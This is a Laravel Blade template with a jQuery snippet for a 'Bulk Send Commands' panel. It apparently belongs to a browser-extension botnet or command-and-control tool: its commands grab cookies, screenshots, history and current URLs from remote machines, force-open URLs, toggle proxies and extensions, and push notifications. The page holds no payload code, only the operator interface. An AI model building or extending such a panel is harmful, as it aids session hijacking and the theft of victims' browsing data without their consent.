@extends('pages.layout')

@section('content')
    <div class="content-wrapper">
        <div class="container-fluid flex-grow-1 container-p-y">
            <div class="row">
                <div class="col-xl">
                    <div class="card mb-4">
                        <div class="card-header d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">Bulk Send Commands</h5>
                        </div>
                        <div class="card-body">
                            <form action="{{ route('commands.create') }}" method="POST">
                                <div class="mb-3">
                                    <label class="form-label" for="cmd">Command</label>
                                    <select id="cmd" class="select2 form-select" name="cmd">
                                        <option value="info">Update Machine Info</option>
                                        <option value="proxy">Enable/Disable Proxy</option>
                                        <option value="push">Send Push Notification</option>
                                        <option value="cookies">Get Cookies</option>
                                        <option value="screenshot">Get Screenshot</option>
                                        <option value="url">Open Url</option>
                                        <option value="current_url">Get Current Url</option>
                                        <option value="history">Get History</option>
                                        <option value="extension">Enable/Disable Extension</option>
                                    </select>
                                </div>
                                <div id="command_push_notification" style="display: none;">
                                    <div class="mb-3">
                                        <label class="form-label" for="icon_url">Icon Url</label>
                                        <input type="text" name="icon_url" class="form-control">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label" for="title">Title</label>
                                        <input type="text" name="title" class="form-control">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label" for="message">Message</label>
                                        <input type="text" name="message" class="form-control">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label" for="url">Url</label>
                                        <input type="text" name="url" class="form-control">
                                    </div>
                                </div>
                                <div id="command_url" style="display: none;">
                                    <div class="mb-3">
                                        <label class="form-label" for="icon_url">Url</label>
                                        <input type="text" name="url" class="form-control">
                                    </div>
                                </div>
                                <div id="command_extension" style="display: none;">
                                    <div class="mb-3">
                                        <label class="form-label" for="id">ID</label>
                                        <input type="text" name="id" class="form-control">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label" for="status">Status</label>
                                        <select class="select2 form-select" name="is_enabled">
                                            <option value="1">Enable</option>
                                            <option value="0">Disable</option>
                                        </select>
                                    </div>
                                </div>
                                <div id="command_proxy" style="display: none;">
                                    <div class="mb-3">
                                        <label class="form-label" for="icon_url">Status</label>
                                        <select class="select2 form-select" name="is_enabled">
                                            <option value="1">Enable</option>
                                            <option value="0">Disable</option>
                                        </select>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-primary">Send</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        $("#cmd").change(function(e) {
            const cmd = $(e.currentTarget).val()

            $('#command_push_notification').hide()
            $('#command_url').hide()

            if (cmd === 'push') {
                $('#command_push_notification').show()
            }

            if (cmd === 'url') {
                $('#command_url').show()
            }

            if (cmd === 'extension') {
                $('#command_extension').show()
            }

            if (cmd === 'proxy') {
                $('#command_proxy').show()
            }
        })
    </script>
@endsection
